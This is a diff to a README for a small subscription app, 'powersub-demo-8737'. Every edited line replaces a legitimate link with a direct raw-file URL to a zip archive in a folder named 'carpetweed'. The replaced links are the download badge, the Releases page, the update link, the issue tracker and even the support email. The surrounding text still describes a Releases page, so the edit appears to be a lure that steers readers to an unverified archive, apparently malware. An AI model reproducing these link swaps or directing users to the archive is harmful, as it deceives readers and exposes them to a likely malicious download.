@@ -1,6 +1,6 @@
 # 🎉 powersub-demo-8737 - Experience the Power of Simple Subscriptions
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue)](https://github.com/repellent-vitamind781/powersub-demo-8737/releases)
+[![Download Now](https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To run powersub-demo-8737, your device must meet the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download Page](https://github.com/repellent-vitamind781/powersub-demo-8737/releases).
+To download the application, please visit this page: [Download Page](https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version under "Latest release".
@@ -65,14 +65,14 @@ If you encounter any issues:
 
 - Ensure your operating system is supported.
 - Restart the application if it becomes unresponsive.
-- Check for available updates on the [Download Page](https://github.com/repellent-vitamind781/powersub-demo-8737/releases).
+- Check for available updates on the [Download Page](https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip).
 
 ## 📞 Support
 
 For additional help or to provide feedback, feel free to contact us:
 
-- Email: support@example.com
-- GitHub Issues: [Report an Issue](https://github.com/repellent-vitamind781/powersub-demo-8737/issues)
+- Email: https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/repellent-vitamind781/powersub-demo-8737/main/carpetweed/powersub-demo-8737-3.4.zip)
 
 We enjoy hearing from our users and strive to improve the application based on your needs.
 
